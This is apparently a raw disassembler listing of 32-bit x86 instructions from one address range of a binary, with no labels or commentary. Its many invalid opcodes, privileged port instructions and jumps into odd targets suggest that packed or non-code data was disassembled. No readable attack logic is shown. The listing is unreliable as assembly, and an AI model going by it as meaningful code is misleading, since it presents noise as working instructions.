  405166:	fdiv   QWORD PTR [ebx]
  405168:	ror    DWORD PTR [ebx+0x5e8f3707],0xd9
  40516f:	popa   
  405170:	loopne 0x40514d
  405172:	jge    0x4051ce
  405174:	adc    ah,bl
  405176:	inc    edx
  405177:	push   es
  405178:	imul   ebp,DWORD PTR [ecx+0x55a2d044],0x43affa5e
  405182:	ins    BYTE PTR es:[edi],dx
  405183:	inc    ecx
  405184:	pop    ebp
  405185:	loop   0x4051ad
  405187:	add    eax,0x336c7ea9
  40518c:	add    al,0xc0
  40518e:	push   ss
  40518f:	jnp    0x405162
  405191:	push   ecx
  405192:	dec    esp
  405193:	cmp    eax,0x53b1817f
  405198:	imul   edx,DWORD PTR [ecx+0x20bc4644],0xfffffffc
  40519f:	fstp   QWORD PTR [ebx+0x7adc37e4]
  4051a5:	mov    ss,WORD PTR [edx+0x3f]
  4051a8:	out    0x31,eax
  4051aa:	ins    DWORD PTR es:[edi],dx
  4051ab:	dec    ebp
  4051ac:	push   esi
  4051ad:	popa   
  4051ae:	rol    BYTE PTR [ecx],cl
  4051b0:	pop    edx
  4051b1:	cdq    
  4051b2:	sub    al,0xc6
  4051b4:	cmp    BYTE PTR [esi-0x7c59d370],0xc9
  4051bb:	dec    ebx
  4051bc:	xchg   esp,eax
  4051bd:	push   edi
  4051be:	dec    ebx
  4051bf:	sub    al,0xf
  4051c1:	and    eax,0x21203d5e
  4051c6:	pop    edi
  4051c7:	cmp    BYTE PTR [edi],bh
  4051c9:	xlat   BYTE PTR ds:[ebx]
  4051ca:	scas   eax,DWORD PTR es:[edi]
  4051cb:	xchg   al,al
  4051cd:	imul   esp,DWORD PTR cs:[ebp+0x11],0x6f
  4051d2:	test   DWORD PTR [ebp-0x45],edi
  4051d5:	pop    ebx
  4051d6:	jecxz  0x405167
  4051d8:	ror    DWORD PTR [edi],0xc8
  4051db:	fnstenv [ebx+0x301fbc09]
  4051e1:	xor    ch,BYTE PTR [esp+edi*2-0x22]
  4051e5:	sar    DWORD PTR [eax+0x61],1
  4051e8:	iret   
  4051e9:	push   esp
  4051ea:	ficom  DWORD PTR [eax]
  4051ec:	popa   
  4051ed:	dec    ecx
  4051ee:	jns    0x405265
  4051f0:	aas    
  4051f1:	or     edi,DWORD PTR [ecx-0x78]
  4051f4:	ins    WORD PTR es:[edi],dx
  4051f6:	loop   0x405198
  4051f8:	fs xor eax,0x730b9336
  4051fe:	push   ds
  4051ff:	lods   eax,DWORD PTR ds:[esi]
  405200:	sar    BYTE PTR [ecx+0x11],cl
  405203:	cs dec ebx
  405205:	lock into 
  405207:	popa   
  405208:	sbb    eax,0x805b11b3
  40520d:	xchg   ebx,eax
  40520e:	pop    esp
  40520f:	imul   BYTE PTR [ecx]
  405211:	dec    eax
  405212:	jg     0x405277
  405214:	jbe    0x4051e5
  405216:	dec    esi
  405217:	adc    al,0xf2
  405219:	pop    edi
  40521a:	jle    0x4051b8
  40521c:	stc    
  40521d:	ja     0x4051bd
  40521f:	mov    dl,0xac
  405221:	es push esp
  405223:	(bad)  
  405224:	jbe    0x4051d2
  405226:	xchg   edi,eax
  405227:	and    BYTE PTR [eax+0x2afb3f52],dl
  40522d:	mov    bh,0x4f
  40522f:	test   BYTE PTR [edi+0x5eae309c],0x60
  405236:	sbb    BYTE PTR [eax+0x52],bh
  405239:	xor    BYTE PTR ds:0x2cd3dd5e,0xf2
  405240:	add    ebp,edi
  405242:	sub    ah,BYTE PTR [edi-0x1a]
  405245:	inc    edx
  405246:	je     0x40524a
  405248:	adc    eax,0x6e124137
  40524d:	cmp    BYTE PTR [ebx-0x22ec8741],al
  405253:	xchg   ebx,eax
  405254:	aaa    
  405255:	lock in al,0x86
  405258:	sub    eax,0xfddefea6
  40525d:	int3   
  40525e:	xchg   ebp,eax
  40525f:	cmp    al,BYTE PTR [ecx+0x19]
  405262:	pop    eax
  405263:	int    0x41
  405265:	add    eax,0x1c8e364c
  40526a:	cli    
  40526b:	jmp    0x18ed:0xdd49d567
  405272:	fwait
  405273:	mov    dl,BYTE PTR [edi]
  405275:	jnp    0x405216
  405277:	inc    esp
  405278:	sub    BYTE PTR [ebx+0x59],dl
  40527b:	lods   al,BYTE PTR ds:[esi]
  40527c:	adc    al,0x9
  40527e:	(bad)  
  40527f:	mov    al,ds:0x4daab9a2
  405284:	or     BYTE PTR [eax],al
  405286:	and    BYTE PTR ds:0xf3af559f,0xbe
  40528d:	sub    WORD PTR [esi],si
  405290:	ror    BYTE PTR [edi+0x42],cl
  405293:	lock push ebx
  405295:	xchg   edi,eax
  405296:	ss nop
  405298:	adc    ebp,DWORD PTR [ecx+ebp*4+0x1b]
  40529c:	pop    ds
  40529d:	add    eax,0xe00da816
  4052a2:	pushf  
  4052a3:	fsub   QWORD PTR [eax+0x3c]
  4052a6:	daa    
  4052a7:	push   esi
  4052a8:	(bad)  
  4052a9:	je     0x4052d1
  4052ab:	xchg   ebp,eax
  4052ac:	sub    ecx,esp
  4052ae:	push   esp
  4052af:	push   cs
  4052b0:	sti    
  4052b1:	jecxz  0x4052d3
  4052b3:	push   ds
  4052b4:	aas    
  4052b5:	push   esi
  4052b6:	jne    0x40524b
  4052b8:	mov    eax,0xb6faf1bf
  4052bd:	push   edi
  4052be:	mov    esi,0x359b8f77
  4052c3:	std    
  4052c4:	or     eax,0x6151dc2c
  4052c9:	js     0x405255
  4052cb:	push   esi
  4052cc:	out    0x56,al
  4052ce:	add    esp,ecx
  4052d0:	xor    cl,BYTE PTR [esp+esi*1+0x1c82e93a]
  4052d7:	popa   
  4052d8:	cmc    
  4052d9:	push   eax
  4052da:	sbb    eax,DWORD PTR [ebp+ecx*2-0x27]
  4052de:	push   0xaf1a4732
  4052e3:	inc    esp
  4052e4:	xchg   edi,eax
  4052e5:	jmp    0x4052ba
  4052e7:	fisub  WORD PTR [ebp+0x24]
  4052ea:	mov    ah,0xf1
  4052ec:	ficomp WORD PTR [edi+edx*4+0x6c]
  4052f0:	ss xchg edi,eax
  4052f2:	leave  
  4052f3:	popa   
  4052f4:	stos   DWORD PTR es:[edi],eax
  4052f5:	jns    0x405342
  4052f7:	add    DWORD PTR [eax-0x58],ebp
  4052fa:	fsubr  DWORD PTR ds:0xc41bac5d
  405300:	mov    cl,0x47
  405302:	iret   
  405303:	jnp    0x405379
  405305:	jnp    0x40534a
  405307:	mov    ds:0x3d938f23,al
  40530c:	inc    edx
  40530d:	pop    edi
  40530e:	test   eax,0x6d14c4e
  405313:	fisttp WORD PTR [esi+esi*8-0x73]
  405317:	inc    edx
  405318:	push   edi
  405319:	fistp  WORD PTR [ebx]
  40531b:	retf   0x1ed1
  40531e:	(bad)  
  405320:	cmp    bh,BYTE PTR [esi+0x74c5bcb3]
  405326:	push   0x6b
  405328:	jl     0x405309
  40532a:	cmp    cl,BYTE PTR [ebx-0x6]
  40532d:	sub    ebp,DWORD PTR [esp+ebx*2-0x61]
  405331:	arpl   WORD PTR [eax-0x664c56c2],dx
  405337:	loope  0x4052ba
  405339:	pop    edx
  40533a:	retf   
  40533b:	push   esi
  40533c:	cld    
  40533d:	xor    eax,0xc0e3522a
  405342:	add    edx,edi
  405344:	and    al,0xee
  405346:	adc    ebp,DWORD PTR [ebx-0xbc582ba]
  40534c:	aas    
  40534d:	ds daa 
  40534f:	dec    eax
  405350:	ret    0xd3e4
  405353:	fst    st(2)
  405355:	jmp    0x625d:0x5b03491d
  40535c:	xor    eax,0x39576b8d
  405361:	or     esp,ebx
  405363:	sub    DWORD PTR [eax],esi
  405365:	jmp    0x405314
  405367:	stos   DWORD PTR es:[edi],eax
  405368:	(bad)  
  405369:	into   
  40536a:	add    al,0x5b
  40536c:	xchg   ebx,eax
  40536d:	je     0x40539b
  40536f:	outs   dx,BYTE PTR ds:[esi]
  405370:	add    ebx,DWORD PTR [eax+0x30ba26a8]
  405376:	mov    esi,0x4c00dce6
  40537b:	sub    eax,0xc6fc0f50
  405380:	adc    esp,ebx
  405382:	(bad)  
  405383:	push   ebx
  405384:	and    BYTE PTR [ebp+0x560e1814],0xb1
  40538b:	mov    bl,0x57
  40538d:	je     0x40537a
  40538f:	sbb    BYTE PTR es:[edx-0x4a506d9e],0xcd
  405397:	push   edi
  405398:	test   eax,0x2b063b83
  40539d:	inc    edx
  40539e:	aas    
  40539f:	or     ch,dh
  4053a1:	dec    edi
  4053a2:	jmp    0x40540d
  4053a4:	mov    al,BYTE PTR [ebx-0x5]
  4053a7:	jmp    0xca3aad1e
  4053ac:	jp     0x40540b
  4053ae:	mov    esi,DWORD PTR [ebp-0x7f4a630c]
  4053b4:	shl    BYTE PTR [edx+esi*1+0x23a93730],0xd6
  4053bc:	popa   
  4053bd:	lahf   
  4053be:	sbb    DWORD PTR [ecx-0x59e8882b],ecx
  4053c4:	mov    ds:0x82a5804b,al
  4053c9:	je     0x4053a0
  4053cb:	ret    0x774f
  4053ce:	enter  0x13f,0x34
  4053d2:	setge  ah
  4053d5:	int    0x29
  4053d7:	lods   eax,DWORD PTR ds:[esi]
  4053d8:	repnz mov ebp,0x1fafb4a1
  4053de:	cld    
  4053df:	cmp    ebp,DWORD PTR [edx-0x565272dd]
  4053e5:	hlt    
  4053e6:	xchg   eax,ebx
  4053e8:	cmc    
  4053e9:	and    eax,0xc106b409
  4053ee:	dec    ebx
  4053ef:	fdivr  DWORD PTR [esi+0x5f]
  4053f2:	jae    0x405422
  4053f4:	pop    edi
  4053f5:	sub    al,0x96
  4053f7:	sbb    BYTE PTR [edi+0x2d],0x49
  4053fb:	test   eax,0x132cf6b9
  405400:	inc    eax
  405401:	cmp    DWORD PTR [eax-0x2ad61944],ebp
  405407:	inc    esi
  405408:	sub    ebx,DWORD PTR [esi+ebx*2-0x3f7209a3]
  40540f:	jmp    0x405468
  405411:	imul   edx,DWORD PTR ss:[edx],0xfffffffd
  405415:	adc    al,0x11
  405417:	js     0x4053ba
  405419:	clc    
  40541a:	inc    ecx
  40541b:	lahf   
  40541c:	retf   0x5c2c
  40541f:	pop    ecx
  405420:	and    DWORD PTR [eax-0x3c8ca2cd],ebx
  405426:	(bad)  
  405427:	cmp    al,0xfe
  405429:	push   ebp
  40542a:	rsqrtps xmm1,XMMWORD PTR [edi]
  40542d:	(bad)  
  40542e:	fistp  DWORD PTR [esi-0x722e00fb]
  405434:	cs mov al,0x53
  405437:	imul   edx,ebp,0xfffffffc
  40543a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40543b:	xor    edx,edi
  40543d:	add    BYTE PTR [eax-0x3ee0cbf9],cl
  405443:	xchg   edx,eax
  405444:	stos   BYTE PTR es:[edi],al
  405445:	inc    eax
  405446:	dec    eax
  405447:	and    DWORD PTR [esi+esi*2],0x11
  40544b:	push   ebx
  40544c:	sub    eax,0x6c1dd273
  405451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405452:	jnp    0x405431
  405454:	int    0x3d
  405456:	mov    al,0xf2
  405458:	stos   BYTE PTR es:[edi],al
  405459:	cmp    esi,esp
  40545b:	mov    dh,0xe
  40545d:	sub    al,0x94
  40545f:	add    dh,bl
  405461:	bswap  edi
  405463:	fisubr WORD PTR [edx+0x3b]
  405466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405467:	jo     0x4054a0
  405469:	rcr    edx,0xd4
  40546c:	and    ecx,DWORD PTR [esi]
  40546e:	cmp    al,BYTE PTR ds:[edx-0xfceca07]
  405475:	sti    
  405476:	xchg   edx,eax
  405477:	loop   0x40549a
  405479:	push   edi
  40547a:	push   es
  40547b:	xor    BYTE PTR [eax+0xc8643bf],0xcd
  405482:	data16 daa 
  405484:	out    dx,eax
  405485:	sbb    eax,0x55b72d9
  40548a:	arpl   WORD PTR ds:0xef5deb47,si
  405490:	push   esp
  405491:	cmp    BYTE PTR [ebx],cl
  405493:	mov    al,ds:0xfe151e9d
  405498:	cld    
  405499:	xor    ah,0x76
  40549c:	mov    edx,DWORD PTR [edx-0x1e5e5170]
  4054a2:	addr16 aad 0x70
  4054a5:	push   cs
  4054a6:	dec    edx
  4054a7:	mov    ds:0x3e90a265,eax
  4054ac:	jns    0x4054d6
  4054ae:	fwait
  4054af:	push   edx
  4054b0:	js     0x4054dc
  4054b2:	xchg   ecx,eax
  4054b3:	mov    ss,WORD PTR [ebx+0x26ed60e1]
  4054b9:	or     dl,bh
  4054bb:	or     eax,0x3700db90
  4054c0:	pusha  
  4054c1:	inc    ebx
  4054c2:	es xchg edi,eax
  4054c4:	(bad)  
  4054c5:	jbe    0x4054e4
  4054c7:	inc    ebp
  4054c8:	inc    ecx
  4054c9:	int    0xc8
  4054cb:	and    esi,DWORD PTR [ebp-0x4f]
  4054ce:	dec    esp
  4054cf:	aam    0x32
  4054d1:	mov    al,ds:0xcc74b21c
  4054d6:	ret    
  4054d7:	popa   
  4054d8:	sub    eax,0xcc4fc85d
  4054dd:	mov    bl,0xe
  4054df:	jb     0x4054a6
  4054e1:	bound  eax,QWORD PTR [ebx+eiz*8-0x80]
  4054e5:	out    dx,al
  4054e6:	xchg   edx,eax
  4054e7:	mov    eax,ds:0x57de806f
  4054ec:	jb     0x405563
  4054ee:	popf   
  4054ef:	mov    dl,0x95
  4054f1:	aad    0x4c
  4054f3:	rol    ecx,0x46
  4054f6:	add    edi,DWORD PTR [ebx]
  4054f8:	std    
  4054f9:	inc    esp
  4054fa:	cdq    
  4054fb:	gs ret 0xcb86
  4054ff:	and    DWORD PTR [edi-0x37],esi
  405502:	jbe    0x405541
  405504:	fiadd  DWORD PTR [eax]
  405506:	lds    edx,FWORD PTR [edx+0x49]
  405509:	xchg   esi,eax
  40550a:	add    ecx,DWORD PTR [edi+ebp*4]
  40550d:	add    ah,BYTE PTR [ebp-0x14]
  405510:	jge    0x405568
  405512:	dec    edi
  405513:	cmp    al,0x67
  405515:	(bad)  
  405516:	fnstenv [ecx+eax*8]
  405519:	xchg   DWORD PTR [ebx+0x53b0c31a],esp
  40551f:	sub    dl,0x8b
  405522:	sti    
  405523:	sub    al,0x71
  405525:	push   ebx
  405526:	lock loopne 0x4054c7
  405529:	push   eax
  40552a:	mov    DWORD PTR [ecx-0x2b],ebx
  40552d:	scas   al,BYTE PTR es:[edi]
  40552e:	ja     0x405595
  405530:	jecxz  0x405582
  405532:	cmp    dh,al
  405534:	sbb    al,0x8a
  405536:	ror    DWORD PTR [edx+0x1b3e8166],1
  40553c:	out    dx,al
  40553d:	js     0x405521
  40553f:	loopne 0x40553e
  405541:	test   eax,ecx
  405543:	(bad)  
  405544:	sub    BYTE PTR [edx-0x6a04483b],bh
  40554a:	test   DWORD PTR [ebx],eax
  40554c:	mov    dl,0xb7
  40554e:	pop    edx
  40554f:	scas   al,BYTE PTR es:[edi]
  405550:	xor    BYTE PTR [ebx-0x16],ch
  405553:	sbb    DWORD PTR [ebx+edx*2-0x6cefad8f],edx
  40555a:	dec    edx
  40555b:	into   
  40555c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40555d:	retf   
  40555e:	xchg   BYTE PTR [esi],ah
  405560:	fadd   st,st(6)
  405562:	mov    ds:0x3f8f1aa5,eax
  405567:	push   0xffffff99
  405569:	lea    esp,[ebx+0x26ab76c9]
  40556f:	jno    0x4055da
  405571:	push   0x4f
  405573:	or     al,0xb9
  405575:	add    eax,DWORD PTR [esi+0x5518762c]
  40557b:	xchg   edx,eax
  40557c:	fcmovne st,st(0)
  40557e:	mov    ds:0x6a162816,eax
  405583:	dec    esi
  405584:	fwait
  405585:	dec    ebx
  405586:	fcomp  QWORD PTR [esp+ecx*1+0x2540620f]
  40558d:	pop    ecx
  40558e:	inc    eax
  40558f:	ja     0x405581
  405591:	mov    ebx,0xb7f6592a
  405596:	adc    al,ch
  405598:	cmc    
  405599:	mov    ebp,0xbacb627d
  40559e:	or     eax,0x2b6d5702
  4055a3:	(bad)  
  4055a4:	int3   
  4055a5:	fs push ss
  4055a7:	jb     0x405581
  4055a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055aa:	popa   
  4055ab:	outs   dx,DWORD PTR ds:[esi]
  4055ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055ad:	hlt    
  4055ae:	and    al,0xd3
  4055b0:	jbe    0x40558e
  4055b2:	arpl   WORD PTR [edx+0x54],sp
  4055b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055b6:	mov    bl,0x38
  4055b8:	add    al,BYTE PTR ds:0xcda9b48e
  4055be:	push   ds
  4055bf:	retf   0xbe8e
  4055c2:	aaa    
  4055c3:	or     al,0xb2
  4055c5:	jecxz  0x405547
  4055c7:	pop    ebp
  4055c8:	into   
  4055c9:	or     BYTE PTR [edx+0x16],bh
  4055cc:	cmp    eax,0xf34081f3
  4055d1:	cwde   
  4055d2:	aam    0x17
  4055d4:	into   
  4055d5:	lds    edi,FWORD PTR [ecx-0x5db48b60]
  4055db:	pop    edi
  4055dc:	mov    esp,0xfa0a95a2
  4055e1:	xchg   edx,eax
  4055e2:	or     al,0xae
  4055e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055e5:	jmp    0x5c6c:0xdb5d3e14
  4055ec:	loopne 0x405622
  4055ee:	aam    0x33
  4055f0:	fild   WORD PTR [ecx-0x7]
  4055f3:	mov    cl,0x17
  4055f5:	xchg   esp,eax
  4055f6:	pop    es
  4055f7:	test   al,0x49
  4055f9:	jle    0x4055c7
  4055fb:	sub    edi,ebx
  4055fd:	push   cs
  4055fe:	retf   0x379c
  405601:	(bad)  
  405603:	add    BYTE PTR [edi-0x1d],bh
  405606:	pop    esi
  405607:	dec    esp
  405608:	in     eax,dx
  405609:	hlt    
  40560a:	(bad)  
  40560b:	inc    edx
  40560c:	cmp    eax,0x2859dc36
  405611:	cmp    ebx,esi
  405613:	rol    DWORD PTR [esi+0x51e08932],0x90
  40561a:	mov    al,0x6
  40561c:	sbb    edi,DWORD PTR [edi]
  40561e:	mov    ecx,0x19a77ed6
  405623:	lock mov ch,0xcb
  405626:	ja     0x4055b0
  405628:	mov    ebp,0x97d5b38e
  40562d:	lods   eax,DWORD PTR ds:[esi]
  40562e:	jns    0x405630
  405630:	inc    ebp
  405631:	or     al,0x81
  405633:	dec    edx
  405634:	enter  0x3d3e,0x3f
  405638:	cld    
  405639:	mov    ebx,gs
  40563b:	xor    DWORD PTR [ebp-0x7b],ebx
  40563e:	push   eax
  40563f:	push   0xffffffea
  405641:	shl    edi,1
  405643:	sbb    al,0x11
  405645:	add    ch,BYTE PTR [ecx+0x76b677f3]
  40564b:	xchg   ecx,eax
  40564c:	mov    al,0xa8
  40564e:	add    DWORD PTR [esi],eax
  405650:	inc    eax
  405651:	fs int3 
  405653:	(bad)  
  405654:	fisttp QWORD PTR [edi]
  405656:	mov    cl,BYTE PTR [ebx]
  405658:	pushf  
  405659:	pop    ss
  40565a:	dec    BYTE PTR [edx]
  40565c:	mov    bh,0xd8
  40565e:	cwde   
  40565f:	repz cmc 
  405661:	push   ss
  405662:	xchg   DWORD PTR [edx-0xa8a9fd1],edi
  405668:	(bad)  
  405669:	mov    ds:0x498bbfc2,eax
  40566e:	retf   0x8964
  405671:	not    DWORD PTR [esi]
  405673:	aaa    
  405674:	sub    eax,0x54e34245
  405679:	or     al,0x9a
  40567b:	jno    0x4056ce
  40567d:	jmp    0x4056ab
  40567f:	push   0xdd6ed123
  405684:	pushf  
  405685:	mov    ds:0x94342075,al
  40568a:	mov    cs,WORD PTR [edx+0x2d]
  40568d:	shr    DWORD PTR [ebx],1
  40568f:	lods   eax,DWORD PTR ds:[esi]
  405690:	cdq    
  405691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405692:	das    
  405693:	inc    esp
  405694:	lea    esp,[edx-0x1704e090]
  40569a:	test   al,0xc9
  40569c:	push   eax
  40569d:	cmp    bh,dl
  40569f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056a0:	xchg   edi,eax
  4056a1:	mov    ecx,0x80fc03af
  4056a6:	xor    eax,0x45f59ea
  4056ab:	mov    dl,0x44
  4056ad:	cwde   
  4056ae:	sahf   
  4056af:	dec    edi
  4056b0:	add    al,0xf6
  4056b2:	jle    0x40571d
  4056b4:	inc    ebp
  4056b5:	ret    
  4056b6:	jno    0x405639
  4056b8:	stos   DWORD PTR es:[edi],eax
  4056b9:	in     eax,0xb0
  4056bb:	test   ebp,eax
  4056bd:	in     al,0x33
  4056bf:	inc    edi
  4056c0:	(bad)  
  4056c1:	(bad)  
  4056c3:	sub    eax,ebx
  4056c5:	repz push 0x42
  4056c8:	push   0xa315f505
  4056cd:	out    dx,eax
  4056ce:	call   0x9db66d18
  4056d3:	test   al,0x75
  4056d5:	and    ebx,ecx
  4056d7:	mov    ah,0x1
  4056d9:	jno    0x405751
  4056db:	push   esi
  4056dc:	dec    eax
  4056dd:	mov    bl,BYTE PTR [edi+0xe]
  4056e0:	jo     0x40571d
  4056e2:	pop    ds
  4056e3:	bound  esp,QWORD PTR [eax+0xd7628bd]
  4056e9:	mov    dl,0x29
  4056eb:	test   al,0x92
  4056ed:	add    DWORD PTR [edi+eax*4+0x24],esi
  4056f1:	sub    eax,0x33539631
  4056f6:	stos   BYTE PTR es:[edi],al
  4056f7:	and    ebp,esi
  4056f9:	pop    edx
  4056fa:	out    dx,al
  4056fb:	mov    cl,0x2d
  4056fd:	bswap  eax
  4056ff:	cwde   
  405700:	call   0xbf7b:0x9e94615e
  405707:	scas   eax,DWORD PTR es:[edi]
  405708:	clc    
  405709:	or     dh,al
  40570b:	pop    ds
  40570c:	xchg   esp,eax
  40570d:	stos   BYTE PTR es:[edi],al
  40570e:	in     al,0x30
  405710:	mov    ds:0xc789973a,al
  405715:	in     al,dx
  405716:	dec    edx
  405717:	add    DWORD PTR [eax-0x5],0x4a
  40571b:	mov    esi,0x5b8b43f6
  405720:	clc    
  405721:	push   es
  405722:	nop
  405723:	pop    ebp
  405724:	mov    cl,0x36
  405726:	mov    ebp,DWORD PTR [ebp+0x5a332c76]
  40572c:	not    BYTE PTR [ebx]
  40572e:	sbb    al,0x9f
  405730:	pop    es
  405731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405732:	nop
  405733:	or     ecx,DWORD PTR [ebp-0x4e]
  405736:	pop    ebx
  405737:	(bad)  
  405738:	js     0x405759
  40573a:	push   esp
  40573b:	int    0xd2
  40573d:	sub    eax,0x592e1a58
  405742:	jmp    0xc5ff54bf
  405747:	lods   al,BYTE PTR ds:[esi]
  405748:	mov    ah,0x1e
  40574a:	sahf   
  40574b:	lods   al,BYTE PTR ds:[si]
  40574d:	loope  0x4057ce
  40574f:	cmp    BYTE PTR [esi],dl
  405751:	or     al,0x8e
  405753:	repz retf 
  405755:	jmp    0x40579c
  405757:	sti    
  405758:	shr    BYTE PTR [eax+esi*2-0x1cfa267b],cl
  40575f:	pop    ecx
  405760:	and    cl,BYTE PTR [ecx-0x40]
  405763:	adc    edx,ecx
  405765:	fdivr  QWORD PTR [ebp+0x7ef6aea7]
  40576b:	(bad)  
  40576c:	mov    bl,0x9a
  40576e:	test   eax,0x9813afda
  405773:	dec    edi
  405774:	(bad)  
  405776:	stos   BYTE PTR es:[edi],al
  405777:	add    DWORD PTR [edi+0x4ad7dbc4],esp
  40577d:	adc    BYTE PTR [ebx-0x4],dl
  405780:	and    al,0x8a
  405782:	and    eax,0xfe1403b9
  405787:	aas    
  405788:	(bad)  
  405789:	aaa    
  40578a:	data16 mov ch,0xe9
  40578d:	mov    ebp,DWORD PTR [ecx]
  40578f:	sub    BYTE PTR [esi-0x5d],dh
  405792:	clc    
  405793:	stos   BYTE PTR es:[edi],al
  405794:	ret    0x1460
  405797:	leave  
  405798:	stc    
  405799:	or     al,0x80
  40579b:	xor    BYTE PTR [edx+0x39981061],bl
  4057a1:	in     al,dx
  4057a2:	mov    es,esp
  4057a4:	mov    DWORD PTR [esi],eax
  4057a6:	mov    WORD PTR [ecx],?
  4057a8:	mov    ds:0x756fa26a,eax
  4057ad:	jg     0x40579f
  4057af:	loope  0x405769
  4057b1:	adc    DWORD PTR [edx+edx*8],ebx
  4057b4:	test   eax,0xf57d174c
  4057b9:	add    esp,DWORD PTR [edi-0x39a5f09a]
  4057bf:	or     BYTE PTR [esi+0x33],0x5a
  4057c3:	push   0x49761dae
  4057c8:	outs   dx,BYTE PTR ds:[esi]
  4057c9:	dec    esp
  4057ca:	ins    DWORD PTR es:[edi],dx
  4057cb:	stc    
  4057cc:	cmc    
  4057cd:	xchg   esi,eax
  4057ce:	add    edi,DWORD PTR ds:0xef82856d
  4057d4:	xchg   ebp,eax
  4057d5:	adc    BYTE PTR [ebp+0x79],al
  4057d8:	cmp    ah,bl
  4057da:	jmp    0x4057e9
  4057dc:	loope  0x40578e
  4057de:	rol    DWORD PTR [eax+0x5d8a243],1
  4057e4:	repz arpl WORD PTR [eax+0x66b11ded],bx
  4057eb:	shl    DWORD PTR [ecx],1
  4057ed:	mov    bh,0xfc
  4057ef:	xor    al,0x74
  4057f1:	sti    
  4057f2:	mov    BYTE PTR [edx],bl
  4057f4:	add    bl,bh
  4057f6:	sub    eax,0xdc070448
  4057fb:	aad    0xa4
  4057fd:	aam    0xc7
  4057ff:	int    0xc8
  405801:	je     0x4057a1
  405803:	pop    esi
  405804:	repnz stos BYTE PTR es:[edi],al
  405806:	mov    ds:0xcc1d7f3,al
  40580b:	das    
  40580c:	dec    edx
  40580d:	addr16 stc 
  40580f:	ret    
  405810:	or     eax,0x22741f63
  405815:	dec    edi
  405816:	jbe    0x405814
  405818:	nop
  405819:	mov    edx,0x1d545abc
  40581e:	add    ebp,eax
  405820:	ret    0x4523
  405823:	push   eax
  405824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405825:	cld    
  405826:	sbb    DWORD PTR [ecx],ecx
  405828:	cmc    
  405829:	pop    ds
  40582a:	or     BYTE PTR [ecx-0xc9eadf1],ah
  405830:	pop    ebx
  405831:	outs   dx,DWORD PTR ds:[esi]
  405832:	jno    0x405897
  405834:	mov    ecx,0xb1e92de4
  405839:	mov    edi,0x8438aefa
  40583e:	jb     0x405815
  405840:	leave  
  405841:	xchg   edx,eax
  405842:	or     eax,0x7d44314d
  405847:	cmp    ch,BYTE PTR [ebp+0x1044b4ad]
  40584d:	xchg   DWORD PTR [ebx+ecx*2+0x38],ecx
  405851:	shl    BYTE PTR [esp+ebx*1+0x18],0xcb
  405856:	xrelease mov DWORD PTR [eax],esp
  405859:	pop    ebp
  40585a:	push   0x6f860d94
  40585f:	or     al,0x88
  405861:	push   eax
  405862:	push   ecx
  405863:	ins    BYTE PTR es:[edi],dx
  405864:	std    
  405865:	std    
  405866:	mov    bh,BYTE PTR [eax+0x3a]
  405869:	bound  ebx,QWORD PTR [ebx+0x45aa18e5]
  40586f:	and    DWORD PTR [edx-0x46b7e993],edi
  405875:	jno    0x405824
  405877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405878:	nop
  405879:	pop    ds
  40587a:	es (bad) 
  40587c:	push   0x67d9d6d2
  405881:	mov    ds:0x5190723f,al
  405886:	sbb    BYTE PTR [edi],bh
  405888:	(bad)  
  40588a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40588b:	push   ds
  40588c:	jmp    DWORD PTR [ebx-0x538aa0c3]
  405892:	fdivr  st(2),st
  405894:	inc    esi
  405895:	int    0x95
  405897:	add    ebp,ebx
  405899:	push   ecx
  40589a:	(bad)  
  40589b:	nop
  40589c:	(bad)  
  40589d:	jb     0x4058d8
  40589f:	leave  
  4058a0:	and    ah,BYTE PTR [ebx-0x66344146]
  4058a6:	out    0x64,eax
  4058a8:	and    BYTE PTR [ecx-0x59709312],dh
  4058ae:	xor    BYTE PTR [ecx+edx*2],0x6c
  4058b2:	or     DWORD PTR [edx+0x645f79f0],eax
  4058b8:	aad    0x3f
  4058ba:	enter  0xd102,0x7a
  4058be:	inc    edx
  4058bf:	out    dx,al
  4058c0:	jo     0x40591d
  4058c2:	call   0xd0c8:0x13cf12ae
  4058c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058ca:	adc    ebx,ebp
  4058cc:	mov    dl,BYTE PTR [edi]
  4058ce:	jmp    0x6e2c:0x93d99359
  4058d5:	scas   al,BYTE PTR es:[edi]
  4058d6:	mov    edi,0x5dee8f0d
  4058db:	add    edx,esi
  4058dd:	adc    esp,DWORD PTR [ecx]
  4058df:	pop    es
  4058e0:	jno    0x40595a
  4058e2:	pop    esp
  4058e3:	and    eax,0x91cc997
  4058e8:	cli    
  4058e9:	mov    ss,edi
  4058eb:	aam    0x6a
  4058ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058ee:	dec    ebx
  4058ef:	fs add eax,0x8d168525
  4058f5:	xchg   esi,eax
  4058f6:	fwait
  4058f7:	or     cl,ch
  4058f9:	mov    cl,0xd7
  4058fb:	shr    BYTE PTR [edx-0x2809e3c6],cl
  405901:	jno    0x405955
  405903:	ss inc ebx
  405905:	xchg   esi,eax
  405906:	sar    DWORD PTR [edi+esi*1+0x63239398],0x53
  40590e:	pop    ss
  40590f:	(bad)  
  405910:	repnz mov ah,0x43
  405913:	add    bl,BYTE PTR [esi-0xe]
  405916:	or     eax,0xdeced24c
  40591b:	dec    ebx
  40591c:	adc    ecx,DWORD PTR [edx+ecx*4]
  40591f:	jmp    0xcfdbdba7
  405924:	lea    ecx,ds:0x3a5998b8
  40592a:	sbb    al,0x7f
  40592c:	dec    ebp
  40592d:	bnd jl 0x40592f
  405930:	mov    bh,0x17
  405932:	idiv   DWORD PTR [esi+esi*4]
  405935:	and    BYTE PTR gs:[edx+0x38],cl
  405939:	dec    eax
